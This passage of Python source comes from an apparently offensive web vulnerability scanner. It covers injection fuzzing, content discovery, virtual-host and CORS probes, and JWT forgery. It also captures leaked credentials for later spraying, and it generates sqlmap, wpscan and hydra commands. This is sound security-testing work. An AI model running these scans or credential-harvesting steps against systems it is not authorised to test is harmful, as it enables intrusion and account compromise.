            out.append(_mk(ip, port, "web-cleartext-login", "high",
                           "Password form submitted over cleartext HTTP", ["CWE-319"],
                           f"A login form (action {f['action']}) submits credentials over HTTP.",
                           "Serve authentication over HTTPS + HSTS."))
        if f["method"] == "post" and f["password"] and not f["csrf"]:
            out.append(_mk(ip, port, "web-csrf", "low",
                           "Login/POST form without an anti-CSRF token", ["CWE-352"],
                           f"Form action {f['action']} (POST, password) has no csrf/token hidden field.",
                           "Add a per-session anti-CSRF token.", confidence="potential"))
    return out


def _inject_param(ip, port, where, param, send, sqli, time_based):
    """Run every input-injection check against one parameter/field via its `send`
    closure: reflection/SSTI, SQLi (optional), open redirect, path traversal."""
    fs = _reflect_via(ip, port, where, send)
    if sqli:
        fs += _sqli_via(ip, port, where, send, time_based)
    fs += _open_redirect_via(ip, port, where, send)
    fs += _traversal_via(ip, port, where, param, send)
    fs += _ssrf_via(ip, port, where, param, send)
    fs += _cmdi_via(ip, port, where, param, send, time_based)
    return fs


def scan_crawl(host: Host, auth: dict | None = None, sqli: bool = True,
               time_based: bool = False, fuzz_risky: bool = False) -> tuple[int, int]:
    """Crawl every web endpoint (authenticated if auth is set), test discovered GET
    params AND form fields for reflection/SSTI, SQL injection, open redirect and path
    traversal, and flag risky forms. `time_based` opts into the slower time-blind SQLi
    probe. Forms whose action/fields signal a real side effect (delete / pay / send /
    upload / ...) are NOT submitted - they're recorded so the operator tests them by
    hand; `fuzz_risky=True` relaxes that (file uploads are still never submitted).
    Returns (pages_crawled, findings_added)."""
    existing = {v.key for v in host.vulns}
    pages = added = 0
    for port in host.open_ports:
        if not is_web(port):
            continue
        cres = crawl(host.ip, port, auth=auth)
        pages += len(cres["pages"])
        fs = _crawl_findings(host.ip, port, cres)
        budget = 24                        # cap injectable targets per endpoint

        # Discovered GET query params (idempotent - always safe to fuzz).
        for pth, prm in cres["params"]:
            if budget <= 0:
                break
            send = _make_sender(host.ip, port, "get", pth, prm, auth)
            fs += _inject_param(host.ip, port, f"param '{prm}' on {pth}", prm,
                                send, sqli, time_based)
            budget -= 1

        # Form fields (POST/GET bodies). Skip forms that would cause a side effect,
        # and record them so nothing is silently untested.
        skipped: list[str] = []
        for form in (cres["forms"] or [])[:6]:
            risk = _form_risk(form, allow_risky=fuzz_risky)
            where_base = f"form {(form.get('method') or 'get').upper()} {form['action']}"
            if risk:
                skipped.append(f"{where_base} ({risk})")
                continue
            for prm in _fuzzable_fields(form):
                if budget <= 0:
                    break
                send = _make_sender(host.ip, port, "form", form, prm, auth)
                fs += _inject_param(host.ip, port, f"field '{prm}' of {where_base}", prm,
                                    send, sqli, time_based)
                budget -= 1
        if skipped:
            fs.append(_mk(host.ip, port, "web-form-unfuzzed", "info",
                          "Form(s) not auto-fuzzed (side-effect risk) - test by hand",
                          ["CWE-200"],
                          "recce did NOT submit these forms to avoid side effects; review "
                          "them manually (or re-run --crawl --fuzz-risky-forms on a "
                          "throwaway target):\n  " + "\n  ".join(skipped[:12]),
                          "N/A - operator note.", confidence="potential"))

        for v in fs:
            if v.key in existing:
                continue
            existing.add(v.key)
            host.vulns.append(v)
            added += 1
    return pages, added


# --- content / directory discovery ---------------------------------------------
# A curated, bounded wordlist of high-signal paths NOT already covered by _PATHS /
# _BACKUPS / the actuator+wordpress deep-dives. Kept small (fast + airgap-embeddable);
# the goal is to surface attack surface (admin panels, API docs, dev/debug, listings),
# not to be a megalist brute-forcer.
_CONTENT_WORDS = [
    # admin / auth surfaces
    "admin", "administrator", "admin/login", "login", "wp-login.php", "user/login",
    "auth", "signin", "portal", "dashboard", "console", "cpanel", "pma", "adminer.php",
    "webadmin", "management", "admin.php", "phpMyAdmin",
    # api / docs
    "api", "api/v1", "api/v2", "swagger", "swagger-ui.html", "swagger.json",
    "openapi.json", "v2/api-docs", "v3/api-docs", "api-docs", "graphiql", "wsdl",
    # dev / debug / info
    "phpinfo.php", "info.php", "test.php", "debug", "trace.axd", "elmah.axd",
    "actuator/env", "metrics", "status", "server-info", "web.config", "config.php",
    "configuration.php", "settings.py", "application.properties",
    # source / vcs / ci / manifests
    ".hg", ".bzr", ".DS_Store", "composer.json", "package.json", "Dockerfile",
    "docker-compose.yml", ".gitlab-ci.yml", "Jenkinsfile", "yarn.lock",
    # storage / listings / dumps
    "backup", "backups", "old", "dev", "test", "tmp", "uploads", "files", "data",
    "db", "sql", "dump.sql", "database.sql", "logs", "backup.zip", "backup.tar.gz",
    # common panels
    "solr", "jenkins", "grafana", "kibana", "prometheus", "nagios", "rabbitmq",
    "gitlab", "gitea", "sonarqube", "nexus", "phpmyadmin",
    # misc info
    "robots.txt", "sitemap.xml", ".well-known/security.txt", "crossdomain.xml",
]
# Paths that, if they return 200, are a finding in their own right (not just surface).
_CONTENT_HIGH = {
    "phpinfo.php": ("high", "phpinfo() exposed"), "info.php": ("high", "phpinfo() exposed"),
    "test.php": ("medium", "PHP test script exposed"),
    "actuator/env": ("high", "Spring Actuator /env exposed (secrets)"),
    "web.config": ("high", "IIS web.config exposed"), "config.php": ("high", "config.php exposed"),
    "configuration.php": ("high", "configuration.php exposed"),
    "settings.py": ("high", "Django settings.py exposed"),
    "application.properties": ("high", "Spring application.properties exposed"),
    ".DS_Store": ("medium", ".DS_Store directory metadata exposed"),
    "swagger.json": ("medium", "OpenAPI/Swagger spec exposed"),
    "openapi.json": ("medium", "OpenAPI/Swagger spec exposed"),
    "swagger-ui.html": ("medium", "Swagger UI exposed"),
    "dump.sql": ("high", "SQL dump exposed"), "database.sql": ("high", "SQL dump exposed"),
    "backup.zip": ("high", "Backup archive exposed"), "backup.tar.gz": ("high", "Backup archive exposed"),
    ".gitlab-ci.yml": ("medium", "CI config exposed"),
}


def _baseline_404(ip: str, port: Port, auth: dict | None):
    """Learn the server's 'not found' shape from random nonexistent paths, so content
    discovery can tell a real hit from a 200-everything SPA/catch-all."""
    shapes = []
    for rp in ("recce-nope-4f9a2c71", "does-not-exist-8b31d0/x.html"):
        r = _fetch(ip, port, "/" + rp, auth=auth)
        if r:
            shapes.append((r[0], len(r[2])))
    return shapes


def _is_baseline(status, body, baseline) -> bool:
    return any(status == bs and abs(len(body) - bl) < 64 for bs, bl in baseline)


def _content_discovery(ip: str, port: Port, base: str, auth: dict | None) -> list[Vuln]:
    """Probe the curated wordlist; report exposed files individually and roll the rest
    (admin panels, API surfaces, protected 401/403 resources) into one discovery finding."""
    baseline = _baseline_404(ip, port, auth)
    # 200-everything catch-all (SPA): status-based discovery is meaningless -> skip.
    if len(baseline) >= 2 and all(s == 200 for s, _ in baseline):
        return []
    findings: list[Vuln] = []
    surface: list[tuple[str, int]] = []
    for word in _CONTENT_WORDS:
        r = _fetch(ip, port, "/" + word, auth=auth)
        if not r:
            continue
        st, _hd, bd = r
        if st not in (200, 301, 302, 307, 308, 401, 403):
            continue
        if _is_baseline(st, bd, baseline):
            continue
        if word in _CONTENT_HIGH and st == 200:
            sev, title = _CONTENT_HIGH[word]
            findings.append(_mk(ip, port, "web-content", sev, f"{title} (/{word})", ["CWE-200"],
                                f"GET {base}/{word} -> HTTP {st}.",
                                "Remove or restrict access to this path."))
        else:
            surface.append((word, st))
    if surface:
        listing = ", ".join(f"/{p} [{s}]" for p, s in surface[:40])
        exposed = any(s == 200 for _, s in surface)
        findings.append(_mk(ip, port, "web-content-map", "medium" if exposed else "low",
                            f"Content discovery: {len(surface)} notable path(s)", ["CWE-200"],
                            f"A curated wordlist against {base} surfaced: {listing}."
                            + ("" if len(surface) <= 40 else f" (+{len(surface) - 40} more)"),
                            "Review each surface; a 401/403 marks a real (protected) resource, "
                            "a 200 an exposed one. Remove what shouldn't be reachable."))
    return findings


# --- virtual-host enumeration ---------------------------------------------------
def _cert_names(ip: str, port: Port) -> set[str]:
    """dNSName SANs + CN from the served TLS cert (when the chain validates)."""
    names: set[str] = set()
    if not probes._is_tls(port):
        return names
    try:
        cert, _proto, _err = probes._peer_cert(ip, port)
    except Exception:  # noqa: BLE001
        return names
    if not cert:
        return names
    for typ, val in cert.get("subjectAltName", []):
        if typ.lower() == "dns":
            names.add(val.lower())
    for rdn in cert.get("subject", []):
        for k, v in rdn:
            if k == "commonName":
                names.add(v.lower())
    return names


def _page_shape(r) -> tuple:
    if not r:
        return (None, "", 0)
    st, _hd, bd = r
    m = _TITLE.search(bd)
    return (st, (m.group(1).strip()[:60] if m else ""), len(bd))


def _discover_vhosts(ip: str, port: Port, base: str, host_hint: str,
                     auth: dict | None) -> tuple[list[Vuln], list[str]]:
    """Host-header probing: candidate names from the TLS cert (SAN/CN), reverse DNS and
    the nmap hostname are requested against the IP; a response that differs from the
    default (IP Host) is a distinct virtual host worth scanning on its own."""
    cands = _cert_names(ip, port)
    if host_hint:
        cands.add(host_hint.lower())
    try:
        cands.add(socket.gethostbyaddr(ip)[0].lower())
    except (OSError, socket.herror):
        pass
    cands = {c for c in cands if c and c != ip and "." in c and "*" not in c}
    if not cands:
        return [], []
    default = _page_shape(_fetch(ip, port, "/", auth={**(auth or {}), "Host": ip}) or _fetch(ip, port, "/", auth=auth))
    found: list[tuple[str, int, str]] = []
    extra: list[Vuln] = []
    for name in sorted(cands)[:20]:
        r = _fetch(ip, port, "/", auth={**(auth or {}), "Host": name})
        st, title, blen = _page_shape(r)
        if st is None:
            continue
        tko = _takeover_service(r[2] if r else "")     # dangling-CNAME takeover on this vhost
        if tko:
            extra.append(_takeover_finding(ip, port, base, name, tko))
        if st != default[0] or title != default[1] or abs(blen - default[2]) > 256:
            found.append((name, st, title))
    if not found:
        return extra, []
    listing = "; ".join(f"{n} [{s}] {t}".strip() for n, s, t in found)
    f = _mk(ip, port, "web-vhost", "info", f"Virtual host(s) discovered: {len(found)}", ["CWE-200"],
            f"Host-header probing on {base} surfaced distinct site(s) vs. the default response: "
            f"{listing}. These serve different content and should be enumerated by name.",
            "Confirm each virtual host is intended to be reachable here; scan the named sites explicitly.")
    return [f, *extra], [n for n, _, _ in found]


def scan_endpoint(ip: str, port: Port, active: bool = True,
                  auth: dict | None = None, creds: bool = False,
                  host_hint: str = "") -> tuple[dict, list[Vuln]]:
    """Deep, non-intrusive scan of one web endpoint. Returns (profile, [Vuln]).
    `auth` (Cookie/Authorization headers) runs the scan as an authenticated user;
    `creds` opts into a tiny, lockout-aware default-credential probe."""
    findings: list[Vuln] = []
    base = url_for(ip, port)
    # Root fetch: fingerprint + directory listing + cookie flags.
    root = _fetch(ip, port, "/", auth=auth)
    status = root[0] if root else None
    headers = root[1] if root else {}
    body = root[2] if root else ""
    fp = fingerprint(headers, body) if root else {"tech": [], "title": ""}
    # Enrich the port's product/version from the web fingerprint when nmap left it
    # blank, so it flows into the CVE mapping + Services-by-Product pivot.
    if root and not port.product:
        prod, ver = product_version(headers, body)
        if prod:
            port.product = prod
            port.version = port.version or ver
            port.detect_source = port.detect_source or "web"
    profile = {"ip": ip, "port": port.portid, "scheme": scheme_for(port),
               "url": base, "status": status,
               "server": headers.get("server", ""), "tech": fp["tech"],
               "title": fp["title"]}
    # Security headers + TLS (reuse the existing stdlib probes).
    findings.extend(probes.http_findings(ip, port))
    if probes._is_tls(port):
        findings.extend(probes.tls_findings(ip, port))
    # JWT weaknesses read from the root response. Passively we flag the algorithm;
    # actively we forge an alg:none token and replay it to prove acceptance.
    if root:
        findings.extend(_scan_jwts(ip, port, headers, body, active=active))
        findings.extend(_scan_deserial(ip, port, headers, body))
    # The active HTTP checks only make sense if the port actually spoke HTTP -
    # skip them for a TLS-only non-HTTP port (LDAPS/IMAPS) so we don't waste a
    # dozen dead requests there (its TLS findings above still count).
    if not active or root is None:
        profile["findings"] = len(findings)
        return profile, findings
    # Directory listing on the root.
    if root and status == 200 and re.search(r"<title>Index of /|Directory listing for", body, re.I):
        findings.append(_mk(ip, port, "web-dirlisting", "medium",
                            "Directory listing enabled", ["CWE-548"],
                            f"GET {profile['url']}/ returned an auto-index page.",
                            "Disable automatic directory indexing (Options -Indexes)."))
    # Cookie hardening (per Set-Cookie): HttpOnly / Secure / SameSite / prefix / scope.
    findings.extend(_cookie_findings(ip, port, headers.get("set-cookie", "")))
    findings.extend(_security_headers(ip, port, headers))
    findings.extend(_csp_findings(ip, port, headers))
    _tko = _takeover_service(body)
    if _tko:
        findings.append(_takeover_finding(ip, port, base, host_hint, _tko))
    # Dangerous HTTP methods. When PUT is advertised AND active, we don't just
    # trust the Allow header - we prove it: PUT a marker, GET it back, DELETE it.
    opt = _fetch(ip, port, "/", method="OPTIONS", auth=auth)
    if opt and opt[1].get("allow"):
        allowed = {m.strip().upper() for m in opt[1]["allow"].split(",")}
        bad = sorted(allowed & _DANGEROUS_METHODS)
        if bad:
            put_proof = _prove_put(ip, port, auth) if ("PUT" in bad and active) else None
            if put_proof and put_proof[0]:
                findings.append(_mk(ip, port, "web-methods", "high",
                    "Arbitrary file write via HTTP PUT (proven)", ["CWE-434", "CWE-650"],
                    put_proof[1], "Disable WebDAV/PUT write; restrict the allowed methods.",
                    confidence="confirmed"))
                others = [m for m in bad if m != "PUT"]
                if others:
                    findings.append(_mk(ip, port, "web-methods", "medium",
                        f"Dangerous HTTP methods advertised: {', '.join(others)}",
                        ["CWE-650"], f"OPTIONS / -> Allow: {opt[1]['allow']}",
                        "Disable unless required.", confidence="potential"))
            else:
                note = f"OPTIONS / -> Allow: {opt[1]['allow']}"
                conf = "confirmed" if active else "potential"
                if put_proof and not put_proof[0]:      # actively tested, PUT rejected
                    note += f"; {put_proof[1]}"
                    conf = "potential"
                sev = "high" if "PUT" in bad else "medium"
                findings.append(_mk(ip, port, "web-methods", sev,
                    f"Dangerous HTTP methods enabled: {', '.join(bad)}", ["CWE-650"],
                    note, "Disable PUT/DELETE/TRACE/CONNECT unless required.",
                    confidence=conf))
    # CORS: reflected-arbitrary-Origin and null-Origin acceptance, both only weaponizable
    # when credentials are allowed (a browser attaches the victim's cookies).
    probe_origin = "https://recce.example"
    seen_cors = False
    cors = _fetch(ip, port, "/", auth={**(auth or {}), "Origin": probe_origin})
    if cors:
        ch = cors[1]
        acao = ch.get("access-control-allow-origin", "")
        acac = ch.get("access-control-allow-credentials", "").lower()
        if acao == probe_origin and acac == "true":
            seen_cors = True
            findings.append(_mk(ip, port, "web-cors", "high",
                                "CORS reflects arbitrary Origin with credentials", ["CWE-942"],
                                f"Origin: {probe_origin} -> Access-Control-Allow-Origin: {acao}, "
                                "Allow-Credentials: true (any site can read authenticated responses).",
                                "Echo only an allow-list of trusted origins; never reflect + credentials."))
    if not seen_cors:                         # null Origin: reachable from a sandboxed iframe
        nc = _fetch(ip, port, "/", auth={**(auth or {}), "Origin": "null"})
        if nc:
            nh = nc[1]
            if nh.get("access-control-allow-origin", "") == "null" and \
                    nh.get("access-control-allow-credentials", "").lower() == "true":
                findings.append(_mk(ip, port, "web-cors", "high",
                    "CORS allows the null Origin with credentials", ["CWE-942"],
                    "Origin: null -> Access-Control-Allow-Origin: null, Allow-Credentials: true "
                    "(a sandboxed iframe / data: document sends 'Origin: null' and can then read "
                    "authenticated responses).",
                    "Never allow-list the null origin; echo only trusted origins."))
    # GraphQL: introspection, plus query batching (brute-force/DoS amplifier) and
    # field-suggestion schema leak when introspection is off.
    gql = '{"query":"query{__schema{queryType{name}}}"}'
    for gp in ("graphql", "api/graphql", "v1/graphql", "query"):
        r = _fetch(ip, port, "/" + gp, method="POST", body=gql, auth=auth)
        if not r or r[0] not in (200, 400):
            continue
        base_gql = f"{profile['url']}/{gp}"
        if r[0] == 200 and ("__schema" in r[2] or '"queryType"' in r[2]):
            findings.append(_mk(ip, port, "web-graphql", "medium",
                                "GraphQL introspection enabled", ["CWE-200"],
                                f"POST {base_gql} (__schema query) returned the schema.",
                                "Disable GraphQL introspection in production."))
        else:
            # Introspection blocked/failed: does the error leak field names ("Did you mean")?
            probe = ('{"query":"query{__typenamee}"}')
            sug = _fetch(ip, port, "/" + gp, method="POST", body=probe, auth=auth)
            if sug and re.search(r"did you mean|didyoumean", sug[2], re.I):
                findings.append(_mk(ip, port, "web-graphql", "low",
                    "GraphQL field-suggestion schema leak", ["CWE-200"],
                    f"POST {base_gql} with an invalid field returned a 'Did you mean' "
                    "suggestion - the schema can be reconstructed field by field even with "
                    "introspection disabled.",
                    "Disable did-you-mean suggestions (production error masking)."))
        # Batching: does it execute an array of queries in one request?
        batch = '[{"query":"query{__typename}"},{"query":"query{__typename}"}]'
        br = _fetch(ip, port, "/" + gp, method="POST", body=batch, auth=auth)
        if br and br[0] == 200 and br[2].count('"__typename"') >= 2:
            findings.append(_mk(ip, port, "web-graphql-batch", "medium",
                "GraphQL query batching enabled", ["CWE-799"],
                f"POST {base_gql} with a 2-query array returned 2 results in one request - "
                "batching amplifies credential brute-force and rate-limit bypass (one HTTP "
                "request = N login/OTP attempts).",
                "Cap or disable array/aliased query batching; rate-limit per operation."))
        break
    # High-signal exposure paths.
    seen_sid: set[str] = set()
    looted_creds: list = []
    for path, sev, sid, title, cwes, fix, confirm in _PATHS:
        r = _fetch(ip, port, "/" + path, auth=auth)
        if not r:
            continue
        st, _hd, bd = r
        try:
            if confirm(st, bd):
                if sid in seen_sid:
                    continue
                seen_sid.add(sid)
                detail = (f"GET {base}/{path} -> HTTP {st} "
                          f"(content matched the {title.split('(')[0].strip()} signature).")
                # For secret-bearing files, show WHAT leaked (redacted).
                if sid in ("web-dotenv", "web-aws", "web-htpasswd"):
                    sec = _leaked_secrets(bd)
                    if sec:
                        detail += "  leaked: " + "; ".join(sec)
                creds_here = _web_credentials(sid, bd, ip, getattr(port, "portid", port))
                if creds_here:
                    looted_creds.extend(creds_here)
                    detail += (f"  CAPTURED {len(creds_here)} cleartext credential(s) "
                               "-> credential store (sprayable): "
                               + ", ".join(c.label for c in creds_here))
                findings.append(_mk(ip, port, sid, sev, title, cwes, detail, fix))
        except Exception:  # noqa: BLE001 - a bad body never breaks the sweep
            continue
    # Exposed .git -> reconstruct the source tree + mine it for secrets/credentials.
    if active and "web-git" in seen_sid:
        looted_creds.extend(_scan_git_dump(ip, port, auth, findings))
    # Deep dives (each self-gates so they cost nothing when absent).
    findings.extend(_scan_actuator(ip, port, base, auth))
    findings.extend(_scan_debug(ip, port, base, auth))
    if active:
        findings.extend(_scan_nosql(ip, port, base, body, auth))
        findings.extend(_scan_xxe(ip, port, base, auth))
    findings.extend(_scan_backups(ip, port, base, auth))
    findings.extend(_scan_reflection(ip, port, base, auth))
    findings.extend(_scan_js(ip, port, base, body, auth))
    if active:
        sm_findings, sm_creds = _scan_sourcemaps(ip, port, base, body, auth)
        findings.extend(sm_findings)
        looted_creds.extend(sm_creds)
    if any("wordpress" in t.lower() for t in fp["tech"]):
        findings.extend(_scan_wordpress(ip, port, base, body, auth))
    if creds:
        findings.extend(_basic_auth_defaults(ip, port, base,
                                             ["/", "/manager/html", "/admin", "/console",
                                              "/api/whoami", "/api/overview"]))
        findings.extend(_form_login_defaults(ip, port, base, fp["tech"]))
    # Content/directory discovery + virtual-host enumeration (active pass).
    findings.extend(_content_discovery(ip, port, base, auth))
    vh_findings, vhosts = _discover_vhosts(ip, port, base, host_hint, auth)
    findings.extend(vh_findings)
    if vhosts:
        profile["vhosts"] = vhosts
    profile["findings"] = len(findings)
    profile["credentials"] = looted_creds
    return profile, findings


def scan_host(host: Host, active: bool = True, auth: dict | None = None,
              creds: bool = False) -> list[dict]:
    """Scan every web endpoint on a host, appending deduped Vulns. Returns the web
    endpoint profiles (for the Web sheet)."""
    existing = {v.key for v in host.vulns}
    profiles: list[dict] = []
    for port in host.open_ports:
        if not is_web(port):
            continue
        profile, findings = scan_endpoint(host.ip, port, active=active, auth=auth, creds=creds,
                                          host_hint=host.hostname or "")
        for v in findings:
            if v.key in existing:
                continue
            existing.add(v.key)
            host.vulns.append(v)
        profiles.append(profile)
    return profiles


# --- categorization + Kali bridge ----------------------------------------------

def web_endpoints(hosts: list[Host]) -> list[dict]:
    """Every web endpoint across all hosts (from stored data - no network), for the
    Web sheet: url, server/tech (nmap), and how many web findings it carries."""
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_web(p):
                continue
            wv = [v for v in h.vulns if v.port == p.portid and v.source == "web"]
            tech = " ".join(t for t in (p.product, p.version, p.extrainfo) if t)
            out.append({"ip": h.ip, "hostname": h.hostname, "port": p.portid,
                        "url": url_for(h.ip, p), "scheme": scheme_for(p),
                        "tech": tech or p.service or "http", "findings": len(wv),
                        "commands": bridge_commands(url_for(h.ip, p), tech, p)})
    return out


def bridge_commands(url: str, tech: str, port: Port) -> str:
    """The exact Kali deep-scan commands for an endpoint, tailored to its stack."""
    host_port = url.split("://", 1)[-1]
    cmds = [f"whatweb -a3 {url}",
            f"nuclei -u {url}",
            f"nikto -h {url}",
            f"gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak",
            # SQLi: crawl the site and test every form/parameter it finds (recce doesn't
            # reimplement a SQLi engine - it bridges to sqlmap, in-philosophy).
            f"sqlmap -u {url} --batch --crawl=2 --forms --level=3 --risk=2 --threads=4 --dbs"]
    low = f"{tech} {url}".lower()
    if "wordpress" in low:
        cmds.append(f"wpscan --url {url} --enumerate p,t,u")
    if "tomcat" in low or ":8080" in url:
        cmds.append(f"nxc http {host_port.split(':')[0]} -M tomcat  # or hydra manager default creds")
    if probes._is_tls(port):
        cmds.append(f"sslscan {host_port}")
    return "  ;  ".join(cmds)
